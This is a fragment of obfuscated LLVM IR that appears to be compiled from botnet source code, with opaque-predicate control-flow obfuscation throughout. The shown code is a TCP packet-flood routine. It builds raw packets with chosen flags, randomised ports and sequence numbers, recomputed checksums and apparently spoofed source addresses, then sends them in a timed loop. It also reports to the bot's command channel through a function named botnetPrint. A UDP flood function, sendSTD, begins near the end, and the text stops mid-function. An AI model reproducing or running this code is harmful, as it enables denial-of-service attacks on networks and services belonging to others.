  %411 = load i32, i32* @y.90
  %412 = sub i32 %410, 1
  %413 = mul i32 %410, %412
  %414 = urem i32 %413, 2
  %415 = icmp eq i32 %414, 0
  %416 = icmp slt i32 %411, 10
  %417 = or i1 %415, %416
  br i1 %417, label %originalBB77, label %originalBB77alteredBB

originalBB77:                                     ; preds = %originalBB77alteredBB, %409
  %418 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %419 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %418, i32 0, i32 0
  %420 = bitcast %union.anon* %419 to %struct.anon.0*
  %421 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %420, i32 0, i32 4
  %422 = load i16, i16* %421, align 4
  %423 = and i16 %422, -4097
  %424 = or i16 %423, 4096
  store i16 %424, i16* %421, align 4
  %425 = load i32, i32* @x.89
  %426 = load i32, i32* @y.90
  %427 = sub i32 %425, 1
  %428 = mul i32 %425, %427
  %429 = urem i32 %428, 2
  %430 = icmp eq i32 %429, 0
  %431 = icmp slt i32 %426, 10
  %432 = or i1 %430, %431
  br i1 %432, label %originalBBpart290, label %originalBB77alteredBB

originalBBpart290:                                ; preds = %originalBB77
  br label %466

; <label>:433:                                    ; preds = %originalBBpart275
  %434 = load i8*, i8** %31, align 8
  %435 = call i32 @strcmp(i8* %434, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.114, i32 0, i32 0)) #9
  %436 = icmp ne i32 %435, 0
  br i1 %436, label %461, label %437

; <label>:437:                                    ; preds = %433
  %438 = load i32, i32* @x.89
  %439 = load i32, i32* @y.90
  %440 = sub i32 %438, 1
  %441 = mul i32 %438, %440
  %442 = urem i32 %441, 2
  %443 = icmp eq i32 %442, 0
  %444 = icmp slt i32 %439, 10
  %445 = or i1 %443, %444
  br i1 %445, label %originalBB92, label %originalBB92alteredBB

originalBB92:                                     ; preds = %originalBB92alteredBB, %437
  %446 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %447 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %446, i32 0, i32 0
  %448 = bitcast %union.anon* %447 to %struct.anon.0*
  %449 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %448, i32 0, i32 4
  %450 = load i16, i16* %449, align 4
  %451 = and i16 %450, -2049
  %452 = or i16 %451, 2048
  store i16 %452, i16* %449, align 4
  %453 = load i32, i32* @x.89
  %454 = load i32, i32* @y.90
  %455 = sub i32 %453, 1
  %456 = mul i32 %453, %455
  %457 = urem i32 %456, 2
  %458 = icmp eq i32 %457, 0
  %459 = icmp slt i32 %454, 10
  %460 = or i1 %458, %459
  br i1 %460, label %originalBBpart2110, label %originalBB92alteredBB

originalBBpart2110:                               ; preds = %originalBB92
  br label %465

; <label>:461:                                    ; preds = %433
  %462 = load i32, i32* @KadenCommStock, align 4
  %463 = load i8*, i8** %31, align 8
  %464 = call i32 (i32, i8*, ...) @botnetPrint(i32 %462, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.115, i32 0, i32 0), i8* %463)
  br label %465

; <label>:465:                                    ; preds = %461, %originalBBpart2110
  br label %466

; <label>:466:                                    ; preds = %465, %originalBBpart290
  br label %467

; <label>:467:                                    ; preds = %466, %381
  br label %468

; <label>:468:                                    ; preds = %467, %353
  br label %469

; <label>:469:                                    ; preds = %468, %originalBBpart263
  %470 = load i32, i32* @x.89
  %471 = load i32, i32* @y.90
  %472 = sub i32 %470, 1
  %473 = mul i32 %470, %472
  %474 = urem i32 %473, 2
  %475 = icmp eq i32 %474, 0
  %476 = icmp slt i32 %471, 10
  %477 = or i1 %475, %476
  br i1 %477, label %originalBB112, label %originalBB112alteredBB

originalBB112:                                    ; preds = %originalBB112alteredBB, %469
  %478 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #3
  store i8* %478, i8** %31, align 8
  %479 = load i32, i32* @x.89
  %480 = load i32, i32* @y.90
  %481 = sub i32 %479, 1
  %482 = mul i32 %479, %481
  %483 = urem i32 %482, 2
  %484 = icmp eq i32 %483, 0
  %485 = icmp slt i32 %480, 10
  %486 = or i1 %484, %485
  br i1 %486, label %originalBBpart2114, label %originalBB112alteredBB

originalBBpart2114:                               ; preds = %originalBB112
  br label %302

; <label>:487:                                    ; preds = %302
  br label %488

; <label>:488:                                    ; preds = %487, %263
  %489 = load i32, i32* @x.89
  %490 = load i32, i32* @y.90
  %491 = sub i32 %489, 1
  %492 = mul i32 %489, %491
  %493 = urem i32 %492, 2
  %494 = icmp eq i32 %493, 0
  %495 = icmp slt i32 %490, 10
  %496 = or i1 %494, %495
  br i1 %496, label %originalBB116, label %originalBB116alteredBB

originalBB116:                                    ; preds = %originalBB116alteredBB, %488
  %497 = call i32 @rand_cmwc()
  %498 = trunc i32 %497 to i16
  %499 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %500 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %499, i32 0, i32 0
  %501 = bitcast %union.anon* %500 to %struct.anon.0*
  %502 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %501, i32 0, i32 5
  store i16 %498, i16* %502, align 2
  %503 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %504 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %503, i32 0, i32 0
  %505 = bitcast %union.anon* %504 to %struct.anon.0*
  %506 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %505, i32 0, i32 6
  store i16 0, i16* %506, align 4
  %507 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %508 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %507, i32 0, i32 0
  %509 = bitcast %union.anon* %508 to %struct.anon.0*
  %510 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %509, i32 0, i32 7
  store i16 0, i16* %510, align 2
  %511 = load i32, i32* %17, align 4
  %512 = icmp eq i32 %511, 0
  %513 = load i32, i32* @x.89
  %514 = load i32, i32* @y.90
  %515 = sub i32 %513, 1
  %516 = mul i32 %513, %515
  %517 = urem i32 %516, 2
  %518 = icmp eq i32 %517, 0
  %519 = icmp slt i32 %514, 10
  %520 = or i1 %518, %519
  br i1 %520, label %originalBBpart2118, label %originalBB116alteredBB

originalBBpart2118:                               ; preds = %originalBB116
  br i1 %512, label %521, label %523

; <label>:521:                                    ; preds = %originalBBpart2118
  %522 = call i32 @rand_cmwc()
  br label %528

; <label>:523:                                    ; preds = %originalBBpart2118
  %524 = load i32, i32* %17, align 4
  %525 = trunc i32 %524 to i16
  %526 = call zeroext i16 @htons(i16 zeroext %525) #10
  %527 = zext i16 %526 to i32
  br label %528

; <label>:528:                                    ; preds = %523, %521
  %529 = phi i32 [ %522, %521 ], [ %527, %523 ]
  %530 = load i32, i32* @x.89
  %531 = load i32, i32* @y.90
  %532 = sub i32 %530, 1
  %533 = mul i32 %530, %532
  %534 = urem i32 %533, 2
  %535 = icmp eq i32 %534, 0
  %536 = icmp slt i32 %531, 10
  %537 = or i1 %535, %536
  br i1 %537, label %originalBB120, label %originalBB120alteredBB

originalBB120:                                    ; preds = %originalBB120alteredBB, %528
  %538 = trunc i32 %529 to i16
  %539 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %540 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %539, i32 0, i32 0
  %541 = bitcast %union.anon* %540 to %struct.anon.0*
  %542 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %541, i32 0, i32 1
  store i16 %538, i16* %542, align 2
  %543 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %544 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %545 = call zeroext i16 @tcpcsum(%struct.iphdr* %543, %struct.tcphdr* %544)
  %546 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %547 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %546, i32 0, i32 0
  %548 = bitcast %union.anon* %547 to %struct.anon.0*
  %549 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %548, i32 0, i32 6
  store i16 %545, i16* %549, align 4
  %550 = bitcast i8* %221 to i16*
  %551 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %552 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %551, i32 0, i32 2
  %553 = load i16, i16* %552, align 2
  %554 = zext i16 %553 to i32
  %555 = call zeroext i16 @csum(i16* %550, i32 %554)
  %556 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %557 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %556, i32 0, i32 7
  store i16 %555, i16* %557, align 2
  %558 = call i64 @time(i64* null) #3
  %559 = load i32, i32* %18, align 4
  %560 = sext i32 %559 to i64
  %561 = add nsw i64 %558, %560
  %562 = trunc i64 %561 to i32
  store i32 %562, i32* %32, align 4
  store i32 0, i32* %33, align 4
  %563 = load i32, i32* @x.89
  %564 = load i32, i32* @y.90
  %565 = sub i32 %563, 1
  %566 = mul i32 %563, %565
  %567 = urem i32 %566, 2
  %568 = icmp eq i32 %567, 0
  %569 = icmp slt i32 %564, 10
  %570 = or i1 %568, %569
  br i1 %570, label %originalBBpart2131, label %originalBB120alteredBB

originalBBpart2131:                               ; preds = %originalBB120
  br label %571

; <label>:571:                                    ; preds = %673, %originalBBpart2143, %originalBBpart2131
  br label %572

; <label>:572:                                    ; preds = %571
  %573 = load i32, i32* %25, align 4
  %574 = bitcast %struct.sockaddr_in* %24 to %struct.sockaddr*
  %575 = call i64 @sendto(i32 %573, i8* %221, i64 %219, i32 0, %struct.sockaddr* %574, i32 16)
  %576 = load i32, i32* %27, align 4
  %577 = call i32 @GRIP(i32 %576)
  %578 = call i32 @htonl(i32 %577) #10
  %579 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %580 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %579, i32 0, i32 8
  store i32 %578, i32* %580, align 4
  %581 = call i32 @rand_cmwc()
  %582 = trunc i32 %581 to i16
  %583 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %584 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %583, i32 0, i32 3
  store i16 %582, i16* %584, align 4
  %585 = call i32 @rand_cmwc()
  %586 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %587 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %586, i32 0, i32 0
  %588 = bitcast %union.anon* %587 to %struct.anon.0*
  %589 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %588, i32 0, i32 2
  store i32 %585, i32* %589, align 4
  %590 = call i32 @rand_cmwc()
  %591 = trunc i32 %590 to i16
  %592 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %593 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %592, i32 0, i32 0
  %594 = bitcast %union.anon* %593 to %struct.anon.0*
  %595 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %594, i32 0, i32 0
  store i16 %591, i16* %595, align 4
  %596 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %597 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %596, i32 0, i32 0
  %598 = bitcast %union.anon* %597 to %struct.anon.0*
  %599 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %598, i32 0, i32 6
  store i16 0, i16* %599, align 4
  %600 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %601 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %602 = call zeroext i16 @tcpcsum(%struct.iphdr* %600, %struct.tcphdr* %601)
  %603 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %604 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %603, i32 0, i32 0
  %605 = bitcast %union.anon* %604 to %struct.anon.0*
  %606 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %605, i32 0, i32 6
  store i16 %602, i16* %606, align 4
  %607 = bitcast i8* %221 to i16*
  %608 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %609 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %608, i32 0, i32 2
  %610 = load i16, i16* %609, align 2
  %611 = zext i16 %610 to i32
  %612 = call zeroext i16 @csum(i16* %607, i32 %611)
  %613 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %614 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %613, i32 0, i32 7
  store i16 %612, i16* %614, align 2
  %615 = load i32, i32* %33, align 4
  %616 = load i32, i32* %23, align 4
  %617 = icmp eq i32 %615, %616
  br i1 %617, label %618, label %673

; <label>:618:                                    ; preds = %572
  %619 = load i32, i32* @x.89
  %620 = load i32, i32* @y.90
  %621 = sub i32 %619, 1
  %622 = mul i32 %619, %621
  %623 = urem i32 %622, 2
  %624 = icmp eq i32 %623, 0
  %625 = icmp slt i32 %620, 10
  %626 = or i1 %624, %625
  br i1 %626, label %originalBB133, label %originalBB133alteredBB

originalBB133:                                    ; preds = %originalBB133alteredBB, %618
  %627 = call i64 @time(i64* null) #3
  %628 = load i32, i32* %32, align 4
  %629 = sext i32 %628 to i64
  %630 = icmp sgt i64 %627, %629
  %631 = load i32, i32* @x.89
  %632 = load i32, i32* @y.90
  %633 = sub i32 %631, 1
  %634 = mul i32 %631, %633
  %635 = urem i32 %634, 2
  %636 = icmp eq i32 %635, 0
  %637 = icmp slt i32 %632, 10
  %638 = or i1 %636, %637
  br i1 %638, label %originalBBpart2135, label %originalBB133alteredBB

originalBBpart2135:                               ; preds = %originalBB133
  br i1 %630, label %639, label %656

; <label>:639:                                    ; preds = %originalBBpart2135
  %640 = load i32, i32* @x.89
  %641 = load i32, i32* @y.90
  %642 = sub i32 %640, 1
  %643 = mul i32 %640, %642
  %644 = urem i32 %643, 2
  %645 = icmp eq i32 %644, 0
  %646 = icmp slt i32 %641, 10
  %647 = or i1 %645, %646
  br i1 %647, label %originalBB137, label %originalBB137alteredBB

originalBB137:                                    ; preds = %originalBB137alteredBB, %639
  %648 = load i32, i32* @x.89
  %649 = load i32, i32* @y.90
  %650 = sub i32 %648, 1
  %651 = mul i32 %648, %650
  %652 = urem i32 %651, 2
  %653 = icmp eq i32 %652, 0
  %654 = icmp slt i32 %649, 10
  %655 = or i1 %653, %654
  br i1 %655, label %originalBBpart2139, label %originalBB137alteredBB

originalBBpart2139:                               ; preds = %originalBB137
  br label %676

; <label>:656:                                    ; preds = %originalBBpart2135
  %657 = load i32, i32* @x.89
  %658 = load i32, i32* @y.90
  %659 = sub i32 %657, 1
  %660 = mul i32 %657, %659
  %661 = urem i32 %660, 2
  %662 = icmp eq i32 %661, 0
  %663 = icmp slt i32 %658, 10
  %664 = or i1 %662, %663
  br i1 %664, label %originalBB141, label %originalBB141alteredBB

originalBB141:                                    ; preds = %originalBB141alteredBB, %656
  store i32 0, i32* %33, align 4
  %665 = load i32, i32* @x.89
  %666 = load i32, i32* @y.90
  %667 = sub i32 %665, 1
  %668 = mul i32 %665, %667
  %669 = urem i32 %668, 2
  %670 = icmp eq i32 %669, 0
  %671 = icmp slt i32 %666, 10
  %672 = or i1 %670, %671
  br i1 %672, label %originalBBpart2143, label %originalBB141alteredBB

originalBBpart2143:                               ; preds = %originalBB141
  br label %571

; <label>:673:                                    ; preds = %572
  %674 = load i32, i32* %33, align 4
  %675 = add i32 %674, 1
  store i32 %675, i32* %33, align 4
  br label %571

; <label>:676:                                    ; preds = %originalBBpart2139
  %677 = load i8*, i8** %28, align 8
  call void @llvm.stackrestore(i8* %677)
  br label %678

; <label>:678:                                    ; preds = %676, %originalBBpart220, %originalBBpart212, %92
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %7
  %679 = alloca i8*, align 8
  %680 = alloca i32, align 4
  %681 = alloca i32, align 4
  %682 = alloca i32, align 4
  %683 = alloca i8*, align 8
  %684 = alloca i32, align 4
  %685 = alloca i32, align 4
  %686 = alloca i32, align 4
  %687 = alloca %struct.sockaddr_in, align 4
  %688 = alloca i32, align 4
  %689 = alloca i32, align 4
  %690 = alloca i32, align 4
  %691 = alloca i8*, align 8
  %692 = alloca %struct.iphdr*, align 8
  %693 = alloca %struct.tcphdr*, align 8
  %694 = alloca i8*, align 8
  %695 = alloca i32, align 4
  %696 = alloca i32, align 4
  store i8* %0, i8** %679, align 8
  store i32 %1, i32* %680, align 4
  store i32 %2, i32* %681, align 4
  store i32 %3, i32* %682, align 4
  store i8* %4, i8** %683, align 8
  store i32 %5, i32* %684, align 4
  store i32 %6, i32* %685, align 4
  %697 = load i32, i32* %685, align 4
  store i32 %697, i32* %686, align 4
  %698 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %687, i32 0, i32 0
  store i16 2, i16* %698, align 4
  %699 = load i32, i32* %680, align 4
  %700 = icmp eq i32 %699, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %46
  %701 = call i32 @rand_cmwc()
  %702 = trunc i32 %701 to i16
  %703 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 1
  store i16 %702, i16* %703, align 2
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %66
  %704 = load i32, i32* %17, align 4
  %705 = trunc i32 %704 to i16
  %706 = call zeroext i16 @htons(i16 zeroext %705) #10
  %707 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 1
  store i16 %706, i16* %707, align 2
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %99
  %708 = load i32, i32* @KadenCommStock, align 4
  %709 = call i32 (i32, i8*, ...) @botnetPrint(i32 %708, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.106, i32 0, i32 0))
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %118
  store i32 1, i32* %26, align 4
  %710 = load i32, i32* %25, align 4
  %711 = bitcast i32* %26 to i8*
  %712 = call i32 @setsockopt(i32 %710, i32 0, i32 3, i8* %711, i32 4) #3
  %713 = icmp slt i32 %712, 0
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %139
  %714 = load i32, i32* @KadenCommStock, align 4
  %715 = call i32 (i32, i8*, ...) @botnetPrint(i32 %714, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.107, i32 0, i32 0))
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %158
  %716 = load i32, i32* %19, align 4
  %717 = icmp eq i32 %716, 0
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %177
  store i32 0, i32* %27, align 4
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %194
  %718 = load i32, i32* %19, align 4
  %_ = shl i32 32, %718
  %_31 = sub i32 32, %718
  %gen = mul i32 %_31, %718
  %_32 = shl i32 32, %718
  %719 = sub nsw i32 32, %718
  %_33 = shl i32 1, %719
  %_34 = sub i32 1, %719
  %gen35 = mul i32 %_34, %719
  %_36 = sub i32 1, %719
  %gen37 = mul i32 %_36, %719
  %_38 = shl i32 1, %719
  %_39 = shl i32 1, %719
  %_40 = shl i32 1, %719
  %720 = shl i32 1, %719
  %_41 = sub i32 %720, 1
  %gen42 = mul i32 %_41, 1
  %_43 = sub i32 0, %720
  %gen44 = add i32 %_43, 1
  %_45 = shl i32 %720, 1
  %_46 = sub i32 %720, 1
  %gen47 = mul i32 %_46, 1
  %_48 = sub i32 %720, 1
  %gen49 = mul i32 %_48, 1
  %721 = sub nsw i32 %720, 1
  %_50 = shl i32 %721, -1
  %_51 = shl i32 %721, -1
  %_52 = shl i32 %721, -1
  %_53 = shl i32 %721, -1
  %_54 = sub i32 %721, -1
  %gen55 = mul i32 %_54, -1
  %722 = xor i32 %721, -1
  store i32 %722, i32* %27, align 4
  br label %originalBB30

originalBB59alteredBB:                            ; preds = %originalBB59, %309
  %723 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %724 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %723, i32 0, i32 0
  %725 = bitcast %union.anon* %724 to %struct.anon.0*
  %726 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %725, i32 0, i32 4
  %727 = load i16, i16* %726, align 4
  %_60 = shl i16 %727, -513
  %728 = and i16 %727, -513
  %_61 = shl i16 %728, 512
  %729 = or i16 %728, 512
  store i16 %729, i16* %726, align 4
  br label %originalBB59

originalBB65alteredBB:                            ; preds = %originalBB65, %333
  %730 = load i8*, i8** %31, align 8
  %731 = call i32 @strcmp(i8* %730, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.111, i32 0, i32 0)) #9
  %732 = icmp ne i32 %731, 0
  br label %originalBB65

originalBB69alteredBB:                            ; preds = %originalBB69, %361
  %733 = load i8*, i8** %31, align 8
  %734 = call i32 @strcmp(i8* %733, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.112, i32 0, i32 0)) #9
  %735 = icmp ne i32 %734, 0
  br label %originalBB69

originalBB73alteredBB:                            ; preds = %originalBB73, %389
  %736 = load i8*, i8** %31, align 8
  %737 = call i32 @strcmp(i8* %736, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.113, i32 0, i32 0)) #9
  %738 = icmp ne i32 %737, 0
  br label %originalBB73

originalBB77alteredBB:                            ; preds = %originalBB77, %409
  %739 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %740 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %739, i32 0, i32 0
  %741 = bitcast %union.anon* %740 to %struct.anon.0*
  %742 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %741, i32 0, i32 4
  %743 = load i16, i16* %742, align 4
  %_78 = sub i16 0, %743
  %gen79 = add i16 %_78, -4097
  %_80 = shl i16 %743, -4097
  %_81 = sub i16 0, %743
  %gen82 = add i16 %_81, -4097
  %_83 = shl i16 %743, -4097
  %_84 = shl i16 %743, -4097
  %_85 = shl i16 %743, -4097
  %_86 = shl i16 %743, -4097
  %744 = and i16 %743, -4097
  %_87 = sub i16 0, %744
  %gen88 = add i16 %_87, 4096
  %745 = or i16 %744, 4096
  store i16 %745, i16* %742, align 4
  br label %originalBB77

originalBB92alteredBB:                            ; preds = %originalBB92, %437
  %746 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %747 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %746, i32 0, i32 0
  %748 = bitcast %union.anon* %747 to %struct.anon.0*
  %749 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %748, i32 0, i32 4
  %750 = load i16, i16* %749, align 4
  %_93 = sub i16 %750, -2049
  %gen94 = mul i16 %_93, -2049
  %_95 = sub i16 0, %750
  %gen96 = add i16 %_95, -2049
  %_97 = sub i16 0, %750
  %gen98 = add i16 %_97, -2049
  %751 = and i16 %750, -2049
  %_99 = sub i16 0, %751
  %gen100 = add i16 %_99, 2048
  %_101 = sub i16 %751, 2048
  %gen102 = mul i16 %_101, 2048
  %_103 = shl i16 %751, 2048
  %_104 = shl i16 %751, 2048
  %_105 = sub i16 %751, 2048
  %gen106 = mul i16 %_105, 2048
  %_107 = sub i16 0, %751
  %gen108 = add i16 %_107, 2048
  %752 = or i16 %751, 2048
  store i16 %752, i16* %749, align 4
  br label %originalBB92

originalBB112alteredBB:                           ; preds = %originalBB112, %469
  %753 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #3
  store i8* %753, i8** %31, align 8
  br label %originalBB112

originalBB116alteredBB:                           ; preds = %originalBB116, %488
  %754 = call i32 @rand_cmwc()
  %755 = trunc i32 %754 to i16
  %756 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %757 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %756, i32 0, i32 0
  %758 = bitcast %union.anon* %757 to %struct.anon.0*
  %759 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %758, i32 0, i32 5
  store i16 %755, i16* %759, align 2
  %760 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %761 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %760, i32 0, i32 0
  %762 = bitcast %union.anon* %761 to %struct.anon.0*
  %763 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %762, i32 0, i32 6
  store i16 0, i16* %763, align 4
  %764 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %765 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %764, i32 0, i32 0
  %766 = bitcast %union.anon* %765 to %struct.anon.0*
  %767 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %766, i32 0, i32 7
  store i16 0, i16* %767, align 2
  %768 = load i32, i32* %17, align 4
  %769 = icmp eq i32 %768, 0
  br label %originalBB116

originalBB120alteredBB:                           ; preds = %originalBB120, %528
  %770 = trunc i32 %529 to i16
  %771 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %772 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %771, i32 0, i32 0
  %773 = bitcast %union.anon* %772 to %struct.anon.0*
  %774 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %773, i32 0, i32 1
  store i16 %770, i16* %774, align 2
  %775 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %776 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %777 = call zeroext i16 @tcpcsum(%struct.iphdr* %775, %struct.tcphdr* %776)
  %778 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %779 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %778, i32 0, i32 0
  %780 = bitcast %union.anon* %779 to %struct.anon.0*
  %781 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %780, i32 0, i32 6
  store i16 %777, i16* %781, align 4
  %782 = bitcast i8* %221 to i16*
  %783 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %784 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %783, i32 0, i32 2
  %785 = load i16, i16* %784, align 2
  %786 = zext i16 %785 to i32
  %787 = call zeroext i16 @csum(i16* %782, i32 %786)
  %788 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %789 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %788, i32 0, i32 7
  store i16 %787, i16* %789, align 2
  %790 = call i64 @time(i64* null) #3
  %791 = load i32, i32* %18, align 4
  %792 = sext i32 %791 to i64
  %_121 = sub i64 %790, %792
  %gen122 = mul i64 %_121, %792
  %_123 = sub i64 0, %790
  %gen124 = add i64 %_123, %792
  %_125 = sub i64 0, %790
  %gen126 = add i64 %_125, %792
  %_127 = shl i64 %790, %792
  %_128 = sub i64 0, %790
  %gen129 = add i64 %_128, %792
  %793 = add nsw i64 %790, %792
  %794 = trunc i64 %793 to i32
  store i32 %794, i32* %32, align 4
  store i32 0, i32* %33, align 4
  br label %originalBB120

originalBB133alteredBB:                           ; preds = %originalBB133, %618
  %795 = call i64 @time(i64* null) #3
  %796 = load i32, i32* %32, align 4
  %797 = sext i32 %796 to i64
  %798 = icmp sgt i64 %795, %797
  br label %originalBB133

originalBB137alteredBB:                           ; preds = %originalBB137, %639
  br label %originalBB137

originalBB141alteredBB:                           ; preds = %originalBB141, %656
  store i32 0, i32* %33, align 4
  br label %originalBB141
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #5

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @sendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  %12 = alloca [36 x i8*], align 16
  %13 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %14 = call i32 @socket(i32 2, i32 2, i32 0) #3
  store i32 %14, i32* %7, align 4
  %15 = call i64 @time(i64* null) #3
  store i64 %15, i64* %8, align 8
  %16 = load i8*, i8** %4, align 8
  %17 = call %struct.hostent* @gethostbyname(i8* %16)
  store %struct.hostent* %17, %struct.hostent** %10, align 8
  %18 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 16, i32 4, i1 false)
  %19 = load %struct.hostent*, %struct.hostent** %10, align 8
  %20 = getelementptr inbounds %struct.hostent, %struct.hostent* %19, i32 0, i32 4
  %21 = load i8**, i8*** %20, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 0
  %23 = load i8*, i8** %22, align 8
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %25 = bitcast %struct.in_addr* %24 to i8*
  %26 = load %struct.hostent*, %struct.hostent** %10, align 8
  %27 = getelementptr inbounds %struct.hostent, %struct.hostent* %26, i32 0, i32 3
  %28 = load i32, i32* %27, align 4
  %29 = sext i32 %28 to i64
  call void @bcopy(i8* %23, i8* %25, i64 %29) #3
  %30 = load %struct.hostent*, %struct.hostent** %10, align 8
  %31 = getelementptr inbounds %struct.hostent, %struct.hostent* %30, i32 0, i32 2
  %32 = load i32, i32* %31, align 8
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %33, i16* %34, align 4
  %35 = load i32, i32* %5, align 4
  %36 = trunc i32 %35 to i16
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %36, i16* %37, align 2
  store i32 0, i32* %11, align 4
  br label %38

; <label>:38:                                     ; preds = %80, %3
  %39 = bitcast [36 x i8*]* %12 to i8*
